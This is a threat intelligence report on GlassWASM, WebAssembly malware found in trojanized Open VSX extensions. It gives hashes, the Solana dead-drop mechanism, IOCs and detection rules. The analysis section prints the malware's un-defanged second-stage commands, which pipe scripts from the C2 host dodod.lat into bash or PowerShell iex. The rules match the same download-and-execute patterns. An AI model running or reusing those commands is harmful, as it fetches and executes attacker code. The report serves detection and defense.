# Technical Analysis Report: GlassWASM — WebAssembly Malware in Trojanized Open VSX Extensions (2026-06-20)

Prepared by: Actioner
Classification: TLP:WHITE
Date: 2026-06-20
Version: 1.1-DRAFT
<!-- revision: v1.1 — applied critic verdict NEEDS-REVISION; cut Solana RPC DNS sigma rule (FP/concreteness); downgraded behavioral sigma levels to medium; added PowerShell long-form variants; fixed YARA TinyGo rule to remove ChaCha20-encrypted strings from condition and downgraded severity; added TLS visibility caveats to Suricata/Snort HTTP rules; documented Snort http_header rationale and DNS detection gap -->

## Executive Summary

GlassWASM is a newly identified malware variant targeting the Open VSX extension marketplace -- the default registry for VS Code forks including VSCodium, Cursor, Windsurf, and Gitpod. Discovered by Socket's Threat Research team and reported on June 20, 2026, the campaign uses trojanized clones of legitimate VS Code Marketplace extensions to deliver a TinyGo-compiled WebAssembly payload that employs ChaCha20 encryption for string obfuscation and Solana blockchain transactions as a dead-drop C2 resolver. The attack is attributed with medium confidence to the "GlassWorm" developer, a threat actor previously linked to at least 72 additional malicious Open VSX extensions since January 2026. Two specific malicious extensions (`exargd.vsblack@0.0.1` and `noellee-doc/flint-debug@0.1.1`) were uploaded between June 9-10, 2026 by the GitHub account `zaitoona43` and have since been removed by the Open VSX team.

The campaign represents a significant evolution in extension supply-chain attacks: by compiling malicious logic into WebAssembly rather than obfuscated JavaScript, the attacker moves the entire decision tree out of inspectable script, defeating conventional static analysis and string-based signature detection. The fileless second stage -- delivered via `curl | bash` (Linux/macOS) or `Invoke-RestMethod | Invoke-Expression` (Windows) -- leaves the final payload open-ended (infostealer, wallet drainer, or additional loader).

## Background: Open VSX Extension Ecosystem

Open VSX is an open-source, vendor-neutral extension marketplace operated by the Eclipse Foundation. It serves as the default extension registry for VS Code forks that cannot use Microsoft's proprietary VS Code Marketplace, including VSCodium, Cursor, Windsurf, and Gitpod. Unlike the official VS Code Marketplace, Open VSX has historically had fewer publisher verification controls, making it an attractive target for supply-chain attackers. Extensions are distributed as `.vsix` files (ZIP archives containing JavaScript code, manifest files, and optional binary assets) and execute with full Node.js privileges within the extension host process.

## Attack Timeline (All Times UTC)

| Timestamp | Event |
|-----------|-------|
| 2026-01-31 | GlassWorm actor begins deploying malicious Open VSX extensions (72+ sleeper extensions) |
| 2026-03-03 to 2026-03-09 | ~151 GitHub repositories compromised with invisible Unicode character payloads |
| ~2026-06-06 | GitHub account `zaitoona43` created (UID 291961103) |
| 2026-06-09 | `exargd.vsblack@0.0.1` uploaded to Open VSX |
| 2026-06-10 | `noellee-doc/flint-debug@0.1.1` uploaded to Open VSX |
| 2026-06-20 | Socket Threat Research team publishes analysis; extensions removed by Open VSX |

## Root Cause: Extension Marketplace Identity Impersonation

The attacker cloned legitimate, verified VS Code Marketplace extensions -- replicating the publisher ID, version number, and repository links -- and re-published them on the Open VSX registry under impersonated publisher namespaces. This is identity impersonation rather than typosquatting: the extensions appeared identical to their legitimate counterparts. The newly created GitHub account `zaitoona43` was created approximately 3 days before extension publication, a common pattern for disposable accounts used in supply-chain attacks.

## Technical Analysis of the Malicious Payload

### 1. Extension Packaging and Delivery

The malicious `.vsix` packages contain a JavaScript shim that loads a bundled WebAssembly module. The WASM files use randomized filenames (`snqpkebiwrxmoivl.wasm`, `orybbbdsuqmaapel.wasm`) to evade simple filename-based detection.

Known package hashes:
- `noellee-doc.flint-debug-0.1.1.vsix`: SHA256 `3aa31999398e7f80231c03d7137ffdb554a84b83dbcffc59ce16c9a65f9e5d58`
- `exargd.vsblack-0.0.1.vsix`: SHA256 `1e283327ad048bea39f4a8501770858a20f3555e87fe3e202274f2e87f8a3c25`

### 2. WebAssembly Stager (GlassWASM Core)

The WASM module is compiled using TinyGo targeting the `js/wasm` platform. This is a significant departure from prior GlassWorm campaigns which used heavily obfuscated JavaScript and .NET binaries. Key characteristics:

- **Size**: 824,552 bytes
- **SHA256**: `558b4f1d9a263c13756ab0126c09dd080c85ba405b29488e1c4e6aa68b554f1f`
- **SHA1**: `8ebac142e34a20c297d3ccaca7ee5d9ddd24fed4`
- **MD5**: `4e143876eeaf5e767a9971f603b0f13c`
- **Toolchain**: TinyGo for `js/wasm` target
- **Obfuscation**: ChaCha20 encryption (constant `expand 32-byte k` at memory offset `0x10000`) -- all meaningful strings (URLs, commands, wallet addresses) remain encrypted until runtime
- **Structure**: 45 data segments using bulk-memory extension; stripped name section (no custom symbols)

**TinyGo Runtime Exports**: `_start`, `malloc`, `free`, `resume`, `go_scheduler`, `asyncify_start_unwind`, `asyncify_stop_rewind`

**Go JS Bridge Imports**: `gojs.syscall/js.valueGet`, `gojs.syscall/js.valueCall`, `gojs.syscall/js.valueInvoke`, `gojs.syscall/js.valueNew`, `gojs.syscall/js.valueSet`, `gojs.syscall/js.stringVal`

**Recovered Go Structure Metadata**:
```
main.sigInfo { Signature, Err, Memo, BlockTime }
main.txResp  { Transaction, AccountKeys, Pubkey, Signer, Instructions }
main.parsedIns { Program, ProgramId, Parsed }
```

### 3. C2 Infrastructure -- Solana Blockchain Dead-Drop

GlassWASM uses the Solana blockchain as a dead-drop resolver to dynamically retrieve C2 server addresses. This technique allows the attacker to rotate C2 infrastructure without modifying the malware payload or changing the watched wallet address.

**Mechanism**:
1. The WASM module queries the Solana public RPC endpoint (`https://api.mainnet.solana.com`)
2. It calls `getSignaturesForAddress` on the attacker-controlled wallet `6ExrZayPZzMMSnszc42cH81DpuKT8FhCX9H6Sesn6rpz` (limit: 50 transactions)
3. For each transaction, it calls `getTransaction` with `jsonParsed` encoding
4. It extracts the C2 hostname from the SPL Memo field attached to transactions
5. SPL Memo programs matched: `MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr` (v2) and `Memo1UhkJRfHyvLMcVucJwxXeuD728EqVDDwQDxFM` (v1)
6. Memo format: `[N] hostname` (numeric length prefix followed by the C2 domain)

**Recovered RPC Request**:
```json
{"id":1,"jsonrpc":"2.0","method":"getSignaturesForAddress",
 "params":["6ExrZayPZzMMSnszc42cH81DpuKT8FhCX9H6Sesn6rpz",{"limit":50}]}
```

**Known C2 Domain**: `dodod[.]lat`

**Sample Solana Transaction Signatures** (2026-05-23 onwards):
- `3gpskPXVJ86xPEtVf1zUVvu278Nu46Hr6pt4veNkiq1AJWxSzKYDfj7zWEdanYaJWqe3C73Y6tcwyASv55vy6QQh`

### 4. Platform-Specific Behavior

#### Linux/macOS

The WASM module uses Node.js `child_process.execSync()` to execute:
```bash
curl -fsSL https://dodod.lat/linux/i/_ | bash
curl -fsSL https://dodod.lat/darwin/i/_ | bash
```

#### Windows

```powershell
powershell -Command "irm https://dodod.lat/win32/i/_ | iex"
```

The `windowsHide: true` option is set on `execSync()` to suppress console window visibility.

### 5. Anti-Forensics / Evasion Techniques

- **WebAssembly obfuscation**: Entire decision tree compiled to WASM binary, defeating JavaScript-level static analysis
- **ChaCha20 string encryption**: All network indicators, wallet addresses, and command strings encrypted at rest; decrypted only in memory at runtime
- **Blockchain dead-drop**: C2 infrastructure rotation without payload modification; Solana wallet rotation across campaigns
- **Stripped symbols**: WASM name section removed to prevent reverse engineering via exported symbol names
- **Fileless second stage**: Payload delivered and executed in memory via pipe (`curl | bash`, `irm | iex`)
- **Identity cloning**: Extensions impersonate legitimate verified publishers rather than using typosquatting
- **Rate-limit handling**: The WASM module includes logic for HTTP rate-limiting (`retry-after` header parsing)
- **Locale checks**: Prior GlassWorm variants avoided Russian systems (locale-based evasion)

## Indicators of Compromise (IOCs)

> **Defanging Convention:** All IOCs in this report use defanged notation to prevent accidental resolution or click-through:
> - URLs: `hxxps://` (e.g., `hxxps://evil[.]com/payload`)
> - Domains: `[.]` replacing dots (e.g., `evil[.]com`)
> - IP addresses: `[.]` replacing dots

### Package / Software Level

| Package / Component | Malicious Version | Description |
|---------------------|-------------------|-------------|
| `exargd.vsblack` (Open VSX) | 0.0.1 | Trojanized clone of legitimate VS Code Marketplace extension |
| `noellee-doc/flint-debug` (Open VSX) | 0.1.1 | Trojanized clone of legitimate VS Code Marketplace extension |
| `@aifabrix/miso-client` (npm) | Unknown | Related GlassWorm malicious npm package |
| `@iflow-mcp/watercrawl-watercrawl-mcp` (npm) | Unknown | Related GlassWorm malicious npm package |

### File System

| Platform | Indicator | Hash (SHA256) | Description |
|----------|-----------|---------------|-------------|
| Cross-platform | `snqpkebiwrxmoivl.wasm` | `558b4f1d9a263c13756ab0126c09dd080c85ba405b29488e1c4e6aa68b554f1f` | GlassWASM TinyGo-compiled WASM payload |
| Cross-platform | `orybbbdsuqmaapel.wasm` | `558b4f1d9a263c13756ab0126c09dd080c85ba405b29488e1c4e6aa68b554f1f` | GlassWASM WASM payload (alternate name) |
| Cross-platform | `noellee-doc.flint-debug-0.1.1.vsix` | `3aa31999398e7f80231c03d7137ffdb554a84b83dbcffc59ce16c9a65f9e5d58` | Malicious VSIX package |
| Cross-platform | `exargd.vsblack-0.0.1.vsix` | `1e283327ad048bea39f4a8501770858a20f3555e87fe3e202274f2e87f8a3c25` | Malicious VSIX package |

### Network

| Type | Value | Context |
|------|-------|---------|
| Domain | `dodod[.]lat` | C2 host resolved from Solana Memo field |
| URL | `hxxps://dodod[.]lat/darwin/i/_` | macOS second-stage download |
| URL | `hxxps://dodod[.]lat/linux/i/_` | Linux second-stage download |
| URL | `hxxps://dodod[.]lat/win32/i/_` | Windows second-stage download |
| URL | `hxxps://api[.]mainnet[.]solana[.]com` | Solana RPC endpoint used for dead-drop resolution |
| Solana Wallet | `6ExrZayPZzMMSnszc42cH81DpuKT8FhCX9H6Sesn6rpz` | Attacker-controlled wallet for C2 instruction delivery |
| GitHub | `github[.]com/zaitoona43` (UID 291961103) | Attacker GitHub account |

### Behavioral

- Node.js extension host process spawning `curl`, `bash`, `sh`, or `powershell.exe` as child processes
- HTTP POST requests to `api.mainnet.solana.com` containing `getSignaturesForAddress` with the attacker wallet address
- `.vsix` extension packages bundling `.wasm` files with randomized 16-character filenames
- `child_process.execSync()` calls with `windowsHide: true` flag from extension context
- Command lines containing `curl -fsSL ... | bash` or `irm ... | iex` patterns originating from Node.js processes

## MITRE ATT&CK Mapping

| TID | Technique | Observed Behavior |
|-----|-----------|-------------------|
| T1195.001 | Supply Chain Compromise: Compromise Software Supply Chain | Trojanized Open VSX extensions cloning legitimate publishers |
| T1059.004 | Command and Scripting Interpreter: Unix Shell | `curl -fsSL ... \| bash` execution on Linux/macOS |
| T1059.001 | Command and Scripting Interpreter: PowerShell | `Invoke-RestMethod \| Invoke-Expression` execution on Windows |
| T1027 | Obfuscated Files or Information | WebAssembly binary with ChaCha20-encrypted strings |
| T1102.001 | Web Service: Dead Drop Resolver | Solana blockchain SPL Memo fields used to resolve C2 hostname |
| T1071.001 | Application Layer Protocol: Web Protocols | HTTP/HTTPS for Solana RPC and C2 stage-2 download |
| T1105 | Ingress Tool Transfer | Fileless download-and-execute of second-stage payload |
| T1564.003 | Hide Artifacts: Hidden Window | `windowsHide: true` flag on `execSync()` to suppress console |

## Impact Assessment

**Breadth**: The Open VSX registry serves VSCodium, Cursor, Windsurf, and Gitpod. Any developer using these tools who installed either of the two identified extensions was potentially compromised. The broader GlassWorm campaign has deployed at least 72 additional malicious extensions since January 2026 and compromised approximately 151 GitHub repositories in early March 2026.

**Depth**: The fileless second-stage loader is open-ended -- it can deliver infostealers, wallet drainers, backdoors, or additional loaders. The full capability of the second-stage payload delivered from `dodod[.]lat` is not documented.

**Stealth**: The WebAssembly + ChaCha20 encryption combination makes static analysis extremely difficult. The blockchain-based C2 resolution adds operational resilience and blends with legitimate Solana traffic.

## Detection & Remediation

### Immediate Detection

Check for installed malicious extensions:
```bash
# List installed extensions (VSCodium)
codium --list-extensions | grep -iE "vsblack|flint-debug"

# List installed extensions (VS Code)
code --list-extensions | grep -iE "vsblack|flint-debug"

# Search for WASM files in extension directories
find ~/.vscode/extensions ~/.vscode-oss/extensions -name "*.wasm" -size +500k -size -1M 2>/dev/null

# Check for known WASM hash
find ~/.vscode/extensions ~/.vscode-oss/extensions -name "*.wasm" -exec sha256sum {} \; 2>/dev/null | grep "558b4f1d9a263c13756ab0126c09dd080c85ba405b29488e1c4e6aa68b554f1f"

# Check DNS logs for Solana RPC or C2 domain
grep -rE "api\.mainnet\.solana\.com|dodod\.lat" /var/log/dns* /var/log/syslog 2>/dev/null
```

### Remediation

1. **Uninstall identified extensions** immediately: `exargd.vsblack`, `noellee-doc/flint-debug`
2. **Scan for WASM files** in all extension directories using the SHA256 hashes listed above
3. **Review DNS/proxy logs** for connections to `dodod[.]lat` and unexpected Solana RPC traffic
4. **Rotate credentials** on any system where the malicious extensions were installed
5. **Review process trees** for any Node.js processes that spawned `curl`, `bash`, or `powershell` subprocesses
6. **Block** `dodod[.]lat` at the DNS/proxy level
7. **Audit** all Open VSX extensions against their VS Code Marketplace counterparts for publisher/version mismatches

### Long-Term Hardening

- Implement extension allow-listing policies for developer workstations
- Monitor for WASM files bundled in VS Code extensions (most legitimate extensions do not bundle WASM)
- Deploy Sysmon or equivalent endpoint telemetry to capture Node.js child process creation events
- Monitor for Solana RPC traffic from non-development systems
- Consider using the official VS Code Marketplace instead of Open VSX where possible
- Implement network-level detection for `curl | bash` and `irm | iex` patterns from IDE processes

## Detection Rules

Rules below cover endpoint behavior, network IOCs, and file-level indicators across Sigma, YARA, Suricata, and Snort. All HTTP-layer network rules require TLS inspection to see HTTPS traffic.

### Sigma: GlassWASM - Node.js Child Process Spawns Curl Piped to Bash

Detects the Linux/macOS fileless delivery chain where Node.js spawns curl piped to bash.
<!-- audit: sigma check exit 0; sigma convert --without-pipeline -t splunk exit 0; sigma convert --without-pipeline -t log_scale exit 0; behavioral TTP rule, not IOC-anchored -->

**Compile**: sigma check ✅ | sigma convert splunk ✅ | sigma convert log_scale ✅
**Confidence**: medium (behavioral -- legitimate extensions may use similar patterns)

```yaml
title: GlassWASM - Node.js Child Process Spawns Curl Piped to Bash
id: 8a1c3e5d-7f2b-4d90-a6e8-3c9b1f0d5e7a
status: experimental
description: >
    Detects Node.js (VS Code extension host) spawning curl with output piped to
    bash, consistent with GlassWASM second-stage fileless delivery on Linux/macOS.
references:
    - https://socket.dev/blog/glasswasm-malware-open-vsx-extensions
    - https://securityonline.info/glasswasm-malware-open-vsx-extensions/
author: Actioner
date: 2026-06-20
tags:
    - attack.t1059.004
    - attack.t1105
logsource:
    category: process_creation
detection:
    selection_parent:
        ParentImage|endswith:
            - '/node'
            - '/node.exe'
            - '\node.exe'
    selection_cmd:
        CommandLine|contains|all:
            - 'curl'
            - '-fsSL'
            - '| bash'
    condition: selection_parent and selection_cmd
falsepositives:
    - Legitimate VS Code extension install scripts that fetch and execute remote scripts
level: medium
```

### Sigma: GlassWASM - Node.js Child Process Spawns PowerShell IRM Piped to IEX

Detects the Windows fileless delivery chain where Node.js spawns PowerShell with Invoke-RestMethod piped to Invoke-Expression (short aliases `irm`/`iex` or long-form cmdlet names).
<!-- audit: sigma check exit 0; sigma convert --without-pipeline -t splunk exit 0; sigma convert --without-pipeline -t log_scale exit 0; behavioral TTP rule, not IOC-anchored -->

**Compile**: sigma check ✅ | sigma convert splunk ✅ | sigma convert log_scale ✅
**Confidence**: medium (behavioral -- legitimate extensions may use similar patterns)

```yaml
title: GlassWASM - Node.js Child Process Spawns PowerShell IRM Piped to IEX
id: 2b4d6f8a-1c3e-5d7f-b9a0-4e2c6d8f0a1b
status: experimental
description: >
    Detects Node.js (VS Code extension host) spawning PowerShell with
    Invoke-RestMethod piped to Invoke-Expression, consistent with GlassWASM
    fileless delivery on Windows.
references:
    - https://socket.dev/blog/glasswasm-malware-open-vsx-extensions
    - https://securityonline.info/glasswasm-malware-open-vsx-extensions/
author: Actioner
date: 2026-06-20
tags:
    - attack.t1059.001
    - attack.t1105
logsource:
    category: process_creation
    product: windows
detection:
    selection_parent:
        ParentImage|endswith: '\node.exe'
    selection_cmd:
        CommandLine|contains|all:
            - 'irm'
            - 'iex'
    selection_cmd_longform:
        CommandLine|contains|all:
            - 'Invoke-RestMethod'
            - 'Invoke-Expression'
    condition: selection_parent and (selection_cmd or selection_cmd_longform)
falsepositives:
    - Legitimate VS Code extensions that invoke PowerShell download-and-execute patterns
level: medium
```

<!-- CUT: "Sigma: DNS Query to Solana Mainnet RPC" was removed in v1.1 review — queries to api.mainnet.solana.com are legitimate in Web3/Solana development environments, making the rule non-specific to GlassWASM and a high false-positive risk. The Solana RPC behavioral indicator is still covered by Suricata SID 2100202 and Snort SID 2100301, which anchor on the attacker wallet address for specificity. -->

### Sigma: GlassWASM - DNS Query to Known C2 Domain dodod.lat

Detects DNS resolution of the confirmed GlassWASM C2 domain.
<!-- audit: sigma check exit 0; sigma convert --without-pipeline -t splunk exit 0; sigma convert --without-pipeline -t log_scale exit 0; IOC-anchored, high confidence but short shelf life -->

**Compile**: sigma check ✅ | sigma convert splunk ✅ | sigma convert log_scale ✅
**Confidence**: high (known malicious domain, no legitimate use)

```yaml
title: GlassWASM - DNS Query to Known C2 Domain dodod.lat
id: 4d6f8b0c-3e5a-7291-d1c3-6a4b8e0f2c4d
status: experimental
description: >
    Detects DNS resolution of the known GlassWASM C2 domain dodod.lat, resolved
    from Solana blockchain SPL Memo fields.
references:
    - https://socket.dev/blog/glasswasm-malware-open-vsx-extensions
    - https://securityonline.info/glasswasm-malware-open-vsx-extensions/
author: Actioner
date: 2026-06-20
tags:
    - attack.t1071.001
logsource:
    category: dns_query
detection:
    selection:
        QueryName|endswith: 'dodod.lat'
    condition: selection
falsepositives:
    - Unlikely - this is a known malicious domain
level: critical
```

### YARA: GlassWASM TinyGo WASM Loader / VSIX Package / Hash Match

Three YARA rules covering: (1) behavioral detection of TinyGo-compiled WASM with ChaCha20 constant (Solana/child_process strings are ChaCha20-encrypted at rest and not matchable by YARA), (2) malicious VSIX package structure, and (3) exact WASM payload hash.
<!-- audit: yarac exit 0; three rules in one file; rule 1 is behavioral (medium confidence), rule 2 targets known package structure (medium), rule 3 is hash-only (high but brittle) -->
<!-- revision: v1.1 — removed plaintext $solana_method1/2, $child_proc, $exec_sync from rule 1 condition; these strings are ChaCha20-encrypted in the binary and not present in cleartext. Detection now relies on TinyGo export/import fingerprint + ChaCha20 constant. Severity downgraded from critical to high. -->

**Compile**: yarac ✅
**Confidence**: Rule 1 medium (behavioral), Rule 2 medium (structural), Rule 3 high (hash-based, brittle)

```yara
rule Malware_GlassWASM_TinyGo_WASM_Loader
{
    meta:
        description = "Detects GlassWASM TinyGo-compiled WebAssembly loader used in trojanized Open VSX extensions. Matches the combination of TinyGo WASM runtime exports, Go JS bridge imports, and ChaCha20 encryption constant."
        author = "Actioner"
        date = "2026-06-20"
        reference = "https://socket.dev/blog/glasswasm-malware-open-vsx-extensions"
        hash = "558b4f1d9a263c13756ab0126c09dd080c85ba405b29488e1c4e6aa68b554f1f"
        tlp = "WHITE"
        severity = "high"

    strings:
        $wasm_magic = { 00 61 73 6D }

        // TinyGo runtime exports (present in cleartext as WASM export names)
        $export_asyncify_start = "asyncify_start_unwind" ascii
        $export_asyncify_stop = "asyncify_stop_rewind" ascii
        $export_go_sched = "go_scheduler" ascii

        // Go JS bridge imports (present in cleartext as WASM import names)
        $import_valueGet = "gojs.syscall/js.valueGet" ascii
        $import_valueCall = "gojs.syscall/js.valueCall" ascii
        $import_valueInvoke = "gojs.syscall/js.valueInvoke" ascii
        $import_valueNew = "gojs.syscall/js.valueNew" ascii
        $import_stringVal = "gojs.syscall/js.stringVal" ascii

        // ChaCha20 constant (present in cleartext as part of the cipher implementation)
        $chacha = "expand 32-byte k" ascii

    condition:
        // NOTE: Solana method names (getSignaturesForAddress, getTransaction) and
        // child_process/execSync strings are ChaCha20-encrypted at rest in the WASM
        // binary and only decrypted at runtime. They are NOT matchable by YARA.
        // Detection relies on TinyGo export/import fingerprint + ChaCha20 constant.
        $wasm_magic at 0 and
        filesize > 500KB and filesize < 2MB and
        2 of ($export_*) and
        3 of ($import_*) and
        $chacha
}

rule Malware_GlassWASM_VSIX_Package
{
    meta:
        description = "Detects GlassWASM malicious VSIX extension packages by structural markers."
        author = "Actioner"
        date = "2026-06-20"
        reference = "https://socket.dev/blog/glasswasm-malware-open-vsx-extensions"
        hash = "3aa31999398e7f80231c03d7137ffdb554a84b83dbcffc59ce16c9a65f9e5d58"
        tlp = "WHITE"
        severity = "critical"

    strings:
        $zip_magic = { 50 4B 03 04 }
        $ext1 = "vsblack" ascii
        $ext2 = "flint-debug" ascii
        $wasm_ref1 = "snqpkebiwrxmoivl.wasm" ascii
        $wasm_ref2 = "orybbbdsuqmaapel.wasm" ascii

    condition:
        $zip_magic at 0 and
        (1 of ($ext*) and 1 of ($wasm_ref*))
}

import "hash"

rule Malware_GlassWASM_WASM_Module_Hash
{
    meta:
        description = "Detects the specific GlassWASM WASM payload by file hash."
        author = "Actioner"
        date = "2026-06-20"
        reference = "https://socket.dev/blog/glasswasm-malware-open-vsx-extensions"
        hash = "558b4f1d9a263c13756ab0126c09dd080c85ba405b29488e1c4e6aa68b554f1f"
        tlp = "WHITE"
        severity = "critical"

    strings:
        $wasm_magic = { 00 61 73 6D }

    condition:
        $wasm_magic at 0 and
        filesize == 824552 and
        hash.sha256(0, filesize) == "558b4f1d9a263c13756ab0126c09dd080c85ba405b29488e1c4e6aa68b554f1f"
}
```

### Suricata: GlassWASM Network Indicators (5 rules)

Five Suricata rules covering: C2 domain DNS query, Solana RPC request with attacker wallet, and three platform-specific C2 download URI patterns.
<!-- audit: suricata -T exit 0 (Suricata 7.0.3); sids 2100201-2100205; IOC-anchored rules have high confidence but short shelf life; Solana RPC rule combines behavioral pattern with IOC for medium confidence -->

> **TLS visibility caveat**: HTTP-layer rules (SIDs 2100202-2100205) require TLS inspection/decryption. HTTPS traffic to `dodod[.]lat` and `api.mainnet.solana.com` will not be visible without SSL interception or a TLS-terminating proxy.

**Compile**: suricata -T ✅
**Confidence**: SID 2100201 high (C2 domain IOC), SID 2100202 high (wallet + RPC method IOC), SIDs 2100203-2100205 high (C2 domain + URI path IOC)

```
# NOTE: DNS rule works on unencrypted DNS traffic. No TLS caveat needed.
alert dns $HOME_NET any -> any any (msg:"Actioner - GlassWASM DNS Query to Known C2 Domain dodod.lat"; flow:to_server; dns.query; content:"dodod.lat"; nocase; fast_pattern; classtype:trojan-activity; reference:url,socket.dev/blog/glasswasm-malware-open-vsx-extensions; metadata:author Actioner, created_at 2026-06-20; sid:2100201; rev:1;)

# NOTE: HTTP-layer rules (SIDs 2100202-2100205) require TLS inspection/decryption.
# HTTPS traffic to dodod[.]lat and api.mainnet.solana.com will not be visible
# without SSL interception or a TLS-terminating proxy.

alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - GlassWASM Solana RPC getSignaturesForAddress Request"; flow:established,to_server; http.method; content:"POST"; http.request_body; content:"getSignaturesForAddress"; fast_pattern; content:"6ExrZayPZzMMSnszc42cH81DpuKT8FhCX9H6Sesn6rpz"; classtype:trojan-activity; reference:url,socket.dev/blog/glasswasm-malware-open-vsx-extensions; metadata:author Actioner, created_at 2026-06-20; sid:2100202; rev:1;)

alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - GlassWASM C2 Stage2 Download Pattern"; flow:established,to_server; http.method; content:"GET"; http.uri; content:"/darwin/i/_"; fast_pattern; http.host; content:"dodod.lat"; classtype:trojan-activity; reference:url,socket.dev/blog/glasswasm-malware-open-vsx-extensions; metadata:author Actioner, created_at 2026-06-20; sid:2100203; rev:1;)

alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - GlassWASM C2 Stage2 Download Linux"; flow:established,to_server; http.method; content:"GET"; http.uri; content:"/linux/i/_"; fast_pattern; http.host; content:"dodod.lat"; classtype:trojan-activity; reference:url,socket.dev/blog/glasswasm-malware-open-vsx-extensions; metadata:author Actioner, created_at 2026-06-20; sid:2100204; rev:1;)

alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - GlassWASM C2 Stage2 Download Windows"; flow:established,to_server; http.method; content:"GET"; http.uri; content:"/win32/i/_"; fast_pattern; http.host; content:"dodod.lat"; classtype:trojan-activity; reference:url,socket.dev/blog/glasswasm-malware-open-vsx-extensions; metadata:author Actioner, created_at 2026-06-20; sid:2100205; rev:1;)
```

### Snort (2.9): GlassWASM Network Indicators (4 rules)

Four Snort 2.9 rules covering Solana RPC abuse with attacker wallet and three platform-specific C2 download patterns.
<!-- audit: snort -c snort.conf -T exit 0 (Snort 2.9.20); sids 2100301-2100304; IOC-anchored; DNS detection not included because Snort 2 lacks DNS sticky buffers and raw content matching is fragile -->

> **TLS visibility caveat**: All HTTP-layer rules (SIDs 2100301-2100304) require TLS inspection/decryption. HTTPS traffic to `dodod[.]lat` and `api.mainnet.solana.com` will not be visible without SSL interception or a TLS-terminating proxy.

> **Snort DNS gap**: DNS detection for `dodod[.]lat` is **not** included in this Snort 2.9 ruleset. Snort 2.9 lacks DNS sticky buffers (`dns_query`), making DNS content matching fragile and unreliable. Use the Suricata ruleset (SID 2100201) for DNS-layer detection of the C2 domain.

> **`http_header` note**: SIDs 2100302-2100304 use `http_header` to match the Host header because Snort 2.9 does not provide `http_host` as a sticky buffer. The `content:"dodod.lat"` match targets the `Host:` header line within `http_header`.

**Compile**: snort -T ✅
**Confidence**: SID 2100301 high (wallet + RPC method IOC), SIDs 2100302-2100304 high (C2 domain + URI path IOC)

```
# NOTE: All HTTP-layer rules (SIDs 2100301-2100304) require TLS inspection/decryption.
# HTTPS traffic to dodod[.]lat and api.mainnet.solana.com will not be visible
# without SSL interception or a TLS-terminating proxy.
#
# NOTE: DNS detection for dodod[.]lat is NOT included in this Snort 2.9 ruleset.
# Snort 2.9 lacks DNS sticky buffers (dns_query), making DNS content matching
# fragile and unreliable. Use the Suricata ruleset for DNS-layer detection.
#
# NOTE: SIDs 2100302-2100304 use http_header to match the Host header because
# Snort 2.9 does not provide http_host as a sticky buffer. The content match
# for "dodod.lat" targets the Host: header line within http_header.

alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Actioner - GlassWASM Solana RPC getSignaturesForAddress with Attacker Wallet"; flow:established,to_server; content:"POST"; http_method; content:"getSignaturesForAddress"; fast_pattern; http_client_body; content:"6ExrZayPZzMMSnszc42cH81DpuKT8FhCX9H6Sesn6rpz"; http_client_body; classtype:trojan-activity; reference:url,socket.dev/blog/glasswasm-malware-open-vsx-extensions; metadata:author Actioner, created 2026-06-20; sid:2100301; rev:1;)

alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Actioner - GlassWASM C2 Stage2 Download macOS Pattern"; flow:established,to_server; content:"GET"; http_method; content:"/darwin/i/_"; fast_pattern; http_uri; content:"dodod.lat"; http_header; classtype:trojan-activity; reference:url,socket.dev/blog/glasswasm-malware-open-vsx-extensions; metadata:author Actioner, created 2026-06-20; sid:2100302; rev:1;)

alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Actioner - GlassWASM C2 Stage2 Download Linux Pattern"; flow:established,to_server; content:"GET"; http_method; content:"/linux/i/_"; fast_pattern; http_uri; content:"dodod.lat"; http_header; classtype:trojan-activity; reference:url,socket.dev/blog/glasswasm-malware-open-vsx-extensions; metadata:author Actioner, created 2026-06-20; sid:2100303; rev:1;)

alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Actioner - GlassWASM C2 Stage2 Download Windows Pattern"; flow:established,to_server; content:"GET"; http_method; content:"/win32/i/_"; fast_pattern; http_uri; content:"dodod.lat"; http_header; classtype:trojan-activity; reference:url,socket.dev/blog/glasswasm-malware-open-vsx-extensions; metadata:author Actioner, created 2026-06-20; sid:2100304; rev:1;)
```

## Lessons Learned

1. **WebAssembly is emerging as a malware obfuscation vector**: By compiling to WASM, attackers can move complex logic out of inspectable JavaScript. Security tools need to add WASM binary analysis capabilities to their scanning pipelines.

2. **Blockchain-based C2 is increasingly practical**: Solana's low transaction costs and high throughput make it an ideal dead-drop medium. The SPL Memo field provides a convenient, censorship-resistant channel for C2 instruction delivery. Defenders should monitor for unexpected blockchain RPC traffic from non-crypto systems.

3. **Open VSX lacks publisher verification parity with VS Code Marketplace**: The ability to impersonate verified publisher namespaces represents a systemic weakness. Extension marketplaces need cryptographic publisher identity binding across registries.

4. **Extension supply chains remain undermonitored**: Most organizations lack visibility into which VS Code extensions their developers install, and most endpoint detection tools do not inspect WASM payloads or monitor Node.js child process creation from IDE contexts.

5. **The GlassWorm campaign is persistent and evolving**: With 72+ sleeper extensions deployed since January 2026 and continuous technique evolution (JavaScript to .NET to WebAssembly), this actor demonstrates sustained operational capability and willingness to invest in evasion research.

## Sources

- [Socket Threat Research - GlassWASM: WebAssembly Malware Found in Trojanized Open VSX Extensions](https://socket.dev/blog/glasswasm-malware-open-vsx-extensions) -- Primary technical analysis with IOCs, WASM binary analysis, and Solana dead-drop mechanism details
- [SecurityOnline - GlassWASM Malware Found in Open VSX Extensions](https://securityonline.info/glasswasm-malware-open-vsx-extensions/) -- Secondary reporting with campaign summary
- [The Hacker News - GlassWorm Supply-Chain Attack Abuses 72 Open VSX Extensions to Target Developers](https://thehackernews.com/2026/03/glassworm-supply-chain-attack-abuses-72.html) -- Broader GlassWorm campaign context with 72 extension details
- [CybersecurityNews - 73 Open VSX Sleeper Extensions Linked to GlassWorm](https://cybersecuritynews.com/73-open-vsx-sleeper-extensions-linked-to-glassworm-malware/) -- GlassWorm sleeper extension analysis
- [Dark Reading - Fresh Wave of GlassWorm VS Extensions Slices Through Supply Chain](https://www.darkreading.com/application-security/fresh-glassworm-vs-code-extensions-supply-chain) -- Industry reporting on GlassWorm evolution

---
*Report generated by Actioner*
